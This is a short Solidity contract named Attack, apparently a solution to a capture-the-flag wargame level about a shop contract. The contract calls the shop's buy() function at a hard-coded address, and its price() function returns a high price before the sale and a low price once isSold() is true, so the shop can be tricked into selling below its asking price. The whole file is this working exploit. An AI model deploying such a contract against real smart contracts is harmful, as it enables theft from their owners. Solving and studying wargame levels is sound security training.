pragma solidity ^0.6.0;

interface IShop {

  function isSold() external returns(bool);
  function buy() external;

}


contract Attack {
    IShop shop = IShop(0x96678CF02e45F01e31683eDF23edE7dE863D0A76);
    
    function call() external {
      shop.buy();
    }

    
    function price() public view returns (uint) {
     
      if (shop.isSold()) {
        return 10;
      }else{
        return 100;
      }

    }
}

